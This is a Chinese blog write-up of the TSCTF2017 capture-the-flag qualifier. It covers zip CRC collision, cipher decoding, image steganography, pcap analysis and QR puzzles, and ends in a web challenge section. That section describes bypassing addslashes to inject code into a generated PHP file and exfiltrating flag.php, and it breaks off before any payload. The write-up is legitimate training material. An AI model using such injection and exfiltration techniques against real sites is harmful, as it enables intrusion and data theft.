<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>TSCTF2017线上初赛WriteUp | SumyBlog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/5.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.3"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.9.0/katex.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="generator" content="Hexo 5.4.0"></head><body><div class="body_container"><canvas id="background-canvas"></canvas><script>$(document).ready(function() {
  var manager = new Manager(window.innerWidth, window.innerHeight);
  var animator = new CanvasAnimation(document.getElementById('background-canvas'), {
      width: window.innerWidth,
      height: window.innerHeight
  });
  animator.addSpirit(manager);
  animator.start();
  window.addEventListener("resize", function () {
      animator.withSize(window.innerWidth, window.innerHeight);
  }, false);
});</script><div id="header"><div class="site-name"><h1 class="hidden">TSCTF2017线上初赛WriteUp</h1><a id="logo" href="/.">SumyBlog</a><p class="description">SumyGG的博客</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/tagcloud/"><i class="fa fa-tag"> 标签</i></a><a href="/watches/"><i class="fa fa-television"> 看一看</i></a><a href="/banners/"><i class="fa fa-sun-o"> 秀一秀</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4 left-post"><div class="content_container"><div class="post"><h1 class="post-title">TSCTF2017线上初赛WriteUp</h1><div class="post-meta">2017-05-15<span> | </span><span class="category"><a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a></span><span id="valine_container_page_pv"> | <span class="leancloud_visitors" id="2017/05/15/tsctf-2017-online-contest-write-up/"><span class="leancloud-visitors-count"><i class="fa fa-spinner fa-spin"></i></span><span> Hits</span></span></span></div><div class="post-content"><p>本着互动娱乐的精神，我们三个人组成了【新建文件夹】队参加了这次TSCTF2017的比赛。比赛题目采用浮动分数值，题目起始分1000，解出的人数越多，题目的分值越低。比赛时长36小时，截止到比赛结束总共放出了30题，我们队解出了其中17题。</p>
<p>下面说一下我们解出题目的解题思路。题目不是按照难度排列的。</p>
<h1 id="misc签到"><a class="markdownIt-Anchor" href="#misc签到"></a> 【MISC】签到</h1>
<p>签到题，关注公众号，给公众号发送消息就可以拿到flag。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image001.png" class="" title="签到题">
<h1 id="misclogo"><a class="markdownIt-Anchor" href="#misclogo"></a> 【MISC】logo</h1>
<p>图片本身是这次比赛主办方战队的logo。似乎有点图片幻想症，起初拿到这张图片后，习惯性的看了一下各种地方，一直没发现什么问题。最后扫了一眼图片二进制，原来flag根本就没藏在图片里。。。直接在图片最后找到了用Base64编码的flag，解码就好了。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image003.png" class="" title="logo编码">
<h1 id="misczipcrc"><a class="markdownIt-Anchor" href="#misczipcrc"></a> 【MISC】zipcrc</h1>
<p>看到题目大概就能想到大体的思路。先打开压缩包看了一下，发现里面有三个文件，crypto、key1、key2和key3。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image005.png" class="" title="压缩包内容">
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image007.png" class="" title="压缩包文件详情">
<p>其中，key1、key2和key3都是4字节大小，考虑可以使用CRC碰撞，碰撞出文件的内容。碰撞脚本使用了github上一个开源的项目<a target="_blank" rel="noopener" href="https://github.com/kmyk/zip-crc-cracker">https://github.com/kmyk/zip-crc-cracker</a>。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image009.png" class="" title="CRC碰撞">
<p>拿到三个文件后，之后的思路陷入了一个误区，被卡住了。首先尝试了一下key1+key2+key3的组合作为压缩包的密码，无果后以为需要通过明文攻击解压缩包的密码key。于是寻找这方面的资料，找到 <code>pkcrack</code>，但是这种攻击方式至少需要<strong>连续</strong>12个字节的<strong>单文件</strong>，显然这样无法解决问题。到这里解题处于停滞状态，只好求助于客服。在说明了我们解出了key1、key2、key3文件的内容后，客服给出的回复是，你们已经解出来了。</p>
<p>放弃了pkcrack的方向，我们转向了key的组合，发现key3+key2+key1才是正确的压缩包密码。赶紧打开crypto文件看了一下，很容易发现是Base64编码。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image011.png" class="" title="crypto文件内容">
<p>解密后是一段Python代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random, base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;TSCTF2017&#x27;</span></span><br><span class="line"></span><br><span class="line">ctMessage = <span class="string">&#x27;k6QqE3TU2qfqytHIatHD6DUOT+7D6vPXFUofQyF7dXjPhkPX9OnN/W5OxkvMfa0=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    flow = <span class="built_in">range</span>(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x = (x + flow[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        flow[i], flow[x] = flow[x], flow[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + flow[x]) % <span class="number">256</span></span><br><span class="line">        flow[x], flow[y] = flow[y], flow[x]</span><br><span class="line">        out.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ flow[(flow[x] + flow[y]) % <span class="number">256</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tsencode</span>(<span class="params">data, key=key, encode=base64.b64encode, salt_length=<span class="number">16</span></span>):</span></span><br><span class="line">    salt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(salt_length):</span><br><span class="line">        salt += <span class="built_in">chr</span>(random.randrange(<span class="number">256</span>))</span><br><span class="line">    data = salt + crypt(data, sha1(key + salt).digest())</span><br><span class="line">    <span class="keyword">if</span> encode:</span><br><span class="line">        data = encode(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>照葫芦画瓢，写了一段解密代码，成功解出了flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tsdecode</span>(<span class="params">data, key=key, decode=base64.b64decode, salt_length=<span class="number">16</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        data = decode(data)</span><br><span class="line">    salt = data[<span class="number">0</span>:salt_length]</span><br><span class="line">    data = data[salt_length:]</span><br><span class="line">    <span class="keyword">return</span> crypt(data, sha1(key + salt).digest())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> tsdecode(ctMessage, key)</span><br></pre></td></tr></table></figure>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image013.png" class="" title="解密结果">
<h1 id="misc至尊宝"><a class="markdownIt-Anchor" href="#misc至尊宝"></a> 【MISC】至尊宝</h1>
<p>这又是一张图片题。“我的意中人是一位盖世英雄,有一天他会身披金甲圣衣、驾着七彩祥云来娶我。哎，至尊宝，你的头箍呢？”看到题目描述一般的思路是想办法将“头箍”找到。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image14.bmp" class="" title="至尊宝">
<p>可惜这个思路先被文件末尾的<code>rar</code>打断了，整个图片文件存在两个文件头，一个bmp文件头，一个rar文件头。我们把rar文件提取出来，却发现压缩包被加密了，无法打开。就这样被卡在这里了。</p>
<p>后来听说有人把头箍找到了，感觉这道题又有了思路。通过查找bmp文件格式，找到了可以修改图片高度的地方，试过几次后把高度改到了最大的高度。得到了一张不明所以的图片。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image016.png" class="" title="带有“头箍”的至尊宝">
<p>题目已经放出了一个提示“MD5”，猜测上面的颜色是否跟md5有关。将颜色转码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#437b93</span><br><span class="line">#0db84b</span><br><span class="line">#8079c2</span><br><span class="line">#dd804a</span><br><span class="line">#71936b</span><br><span class="line">#5f3ab9</span><br><span class="line">#78c64a</span><br><span class="line">#766522</span><br><span class="line">#24e2e2</span><br><span class="line">#31e05f</span><br><span class="line">#ca3571</span><br><span class="line">#f262d7</span><br><span class="line">#96bed1</span><br><span class="line">#ab30e8</span><br><span class="line">#a2d5a8</span><br><span class="line">#ddee6f</span><br></pre></td></tr></table></figure>
<p>每32位一组，正好分成三组，组成MD5后放到网站上解码，得到了 <code>something</code> <code>atthe</code> <code>bottom</code> 的提示？！！，bottom不就是那个rar文件？这又陷入了一次僵局，最后死马当活马医。组合起来当成密码，成功解密了rar压缩包。</p>
<p>之后的道路比较顺利，压缩包里有个pptx文件，改成zip文件解压，然后挨个文件翻阅，最后找到了flag。</p>
<h1 id="misceasycrypto"><a class="markdownIt-Anchor" href="#misceasycrypto"></a> 【MISC】easyCrypto</h1>
<p>这道题是一个解码题，阅读代码，然后写出解码代码。解码代码在decode里。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cypher_text = <span class="string">&#x27;DgYiZFttExBafXJPPn8BNhI9cwEhaUMgPmg+IA==&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">iv = struct.unpack(<span class="string">&quot;I&quot;</span>, <span class="string">&#x27;x1a0&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;iv is &#x27;</span>, <span class="built_in">hex</span>(iv)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypto</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> data ^ data &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">datas, iv</span>):</span></span><br><span class="line">    cypher = []</span><br><span class="line">    datas_length = <span class="built_in">len</span>(datas)</span><br><span class="line">    cypher += [crypto(datas[<span class="number">0</span>] ^ iv)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, datas_length):</span><br><span class="line">        cypher += [crypto(cypher[i-<span class="number">1</span>] ^ datas[i])]</span><br><span class="line"></span><br><span class="line">    cyphertext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cypher:</span><br><span class="line">        cyphertext += struct.pack(<span class="string">&quot;I&quot;</span>, c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(cyphertext)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">4</span> - <span class="built_in">len</span>(flag) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> padding != <span class="number">0</span>:</span><br><span class="line">    flag = flag + <span class="string">&quot;\x00&quot;</span> * padding</span><br><span class="line"></span><br><span class="line">datas = struct.unpack(<span class="string">&quot;I&quot;</span> * (<span class="built_in">len</span>(flag) / <span class="number">4</span>), flag)</span><br><span class="line"><span class="built_in">print</span> encode(datas, iv)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">cypher_text,iv</span>):</span></span><br><span class="line">    cypher_text = base64.b64decode(cypher_text)</span><br><span class="line">    padding = <span class="number">4</span> - <span class="built_in">len</span>(cypher_text) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> padding != <span class="number">0</span>:</span><br><span class="line">        cypher_text = cypher_text + <span class="string">&quot;\x00&quot;</span> * padding</span><br><span class="line"></span><br><span class="line">    l = cypher_text</span><br><span class="line">    crypher = struct.unpack(<span class="string">&quot;I&quot;</span>*(<span class="built_in">len</span>(l)/<span class="number">4</span>),l)</span><br><span class="line">    datas = []</span><br><span class="line">    datas += [ decrypto(crypher[<span class="number">0</span>]) ^ iv ]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(crypher)):</span><br><span class="line">        datas += [decrypto(crypher[i]) ^ crypher[i-<span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">return</span> datas</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypto</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> data ^ (data &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">datas = decode(cypher_text,iv)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> datas:</span><br><span class="line">    res += struct.pack(<span class="string">&quot;I&quot;</span>,i)</span><br><span class="line"><span class="built_in">print</span> res</span><br></pre></td></tr></table></figure>
<h1 id="misc神秘的文件"><a class="markdownIt-Anchor" href="#misc神秘的文件"></a> 【MISC】神秘的文件</h1>
<p>这个题给了一个pcapng文件，用软件打开后开始分析。大概是一个ftp传输过程，由于传输协议未使用加密，泄露了传输文件的内容。传输的文件有两个，一个flag.zip还有一个txt文件。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image058.png" class="" title="txt文件内容">
<p>看到txt文件内容后，写了个程序猜测一下明文是什么。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmd5</span>(<span class="params">s</span>):</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(s)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line">MD5_pass = <span class="string">&#x27;24885fdab795c41166d6f0067782dc9f&#x27;</span></span><br><span class="line">or_pass = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>]</span><br><span class="line">arr_pass = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(arr_pass)&gt;<span class="number">0</span>):</span><br><span class="line">        cur = arr_pass.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span>(getmd5(cur)==MD5_pass):</span><br><span class="line">            <span class="built_in">print</span> cur</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> or_pass:</span><br><span class="line">                arr_pass.append(cur+i)</span><br><span class="line">run()</span><br></pre></td></tr></table></figure>
<p>解出密码为 ah%kyq$</p>
<p>有了密码，dump出flag.zip文件，用密码解压缩。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image060.png" class="" title="压缩包文件">
<p>解压缩zip文件，拿到其中的文件，把其中的一段用Base64解码 <code>TSCTF&#123;tsctf_revolution_2017_May&#125;</code> 。</p>
<h1 id="misc四维码"><a class="markdownIt-Anchor" href="#misc四维码"></a> 【MISC】四维码</h1>
<p>四维码这个题目感觉还是很不错的，不过脑洞还是有点大，基本上就是一步步跟着HINT来的。</p>
<p>首先题目给了一个gif，其中每一帧有一个二维码，将每一帧扫到的字母拼接起来，得到一个网址 <code>https://twitter.com/pinkotsctf</code> 这是一个twitter账号，账号里只有一条消息，有一张图片。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image062.png" class="" title="四维码twitter">
<p>拿到图片后扫了一下二维码，取到 <code>NNSXSPLROJRW6ZDF</code> ，意味不明。这时候有了个HINT，提示用Base32解码，得到<code>key=qrcode</code> 。还是意味不明。</p>
<p>我们发现了图像上半部分的白色存在不一致的问题，但是找不到什么规律。又分析了一下基本信息，基本上束手无措。此时放出来一个HINT，“谷歌搜图”。通过谷歌搜图，在github找到了一个开源库<a target="_blank" rel="noopener" href="https://github.com/fbngrm/Matroschka">fbngrm/Matroschka</a>。</p>
<p>肯定是用的这个，看这个库的解密命令 <code>python matroschka.py -open -m &lt;mac-password&gt; -k &lt;password&gt; &lt;image&gt;</code> ， <strong>password</strong> 是<code>qrcode</code>， <strong>mac-password</strong> 是个啥？最后试了试，貌似随便的字符串都可以，对图片没有影响。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image064.png" class="" title="解密出来的二维码">
<p>解出来的图片不是很清晰，用ps稍微调整了一下，然后扫描一下拿到了一串数字 <code>000000000011010010000111101110101001110110010010011110110010111001010011000010011110100100110000101100100111011000010100101001100001101000111011000101110100001011001001110110010000100110101100100001111010010011000111010110000000000</code>。再次意味不明。。。</p>
<p>思考过程，ascii码二进制不可能，想到了0-1代表像素。写了个html枚举一下宽度，看看哪个图片最像？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        #containter &#123;</span><br><span class="line"><span class="css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .white &#123;</span><br><span class="line"><span class="css">            <span class="attribute">background</span>: white;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .black &#123;</span><br><span class="line"><span class="css">            <span class="attribute">background</span>: black;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;containter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = <span class="string">&quot;000000000011010010000111101110101001110110010010011110110010111001010011000010011110100100110000101100100111011000010100101001100001101000111011000101110100001011001001110110010000100110101100100001111010010011000111010110000000000&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> containter = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;containter&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> width = <span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// var linecount = 1;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> topx = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> onecnt = <span class="number">20</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> linecount = <span class="number">1</span>; linecount &lt; str.length; linecount++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> ele = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="javascript">                ele.style.position = <span class="string">&quot;absolute&quot;</span>;</span></span><br><span class="line"><span class="javascript">                ele.style.width = width + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                ele.style.height = width + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                ele.style.left = ((i % linecount) * width) + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                ele.style.top = (topx + <span class="built_in">Math</span>.floor(i / linecount) * width) + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (str[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    ele.className = <span class="string">&quot;white&quot;</span>;</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    ele.className = <span class="string">&quot;black&quot;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">                containter.appendChild(ele);</span><br><span class="line">            &#125;</span><br><span class="line">            if (linecount == str.length-1 &amp;&amp; onecnt &gt; 0) &#123;</span><br><span class="line">                linecount--;</span><br><span class="line">                onecnt--;</span><br><span class="line">                topx += width;</span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                topx += (<span class="built_in">Math</span>.floor(str.length / linecount) * width + <span class="number">50</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>没有图片符合样子的，好奇怪。。。这道题卡了好久，抱着死马当活马医的心态加宽高度，作为条形码试试。。。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image066.png" class="" title="就是一个条形码">
<p>解决了这道题，太好了。</p>
<h1 id="webweb"><a class="markdownIt-Anchor" href="#webweb"></a> 【WEB】Web</h1>
<p>上来网页给了一个提示</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image020.png" class="" title="首页提示">
<p>访问 <strong>re.php</strong> ，网页给出了该页的php代码。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image022.png" class="" title="re.php">
<p>计大意是在 tmp 目录下生成一个随机字符的 php 名，写入了$shell=’’;的句子，然后输入的 shell 参数加入到单引号内，根据提示是要查看 flag.php。关键点是绕过 addslashes 这个函数。</p>
<p>网上查看了一番，可以用宽字符或双斜线匹配来绕过。但是不知道为什么php的网页回显被关闭了（后来才知道，$shell是要执行的shell命令，不是php命令），于是考虑用发送网络请求获取flag.php的信息。</p>
<p>构造的参数如下：</p>
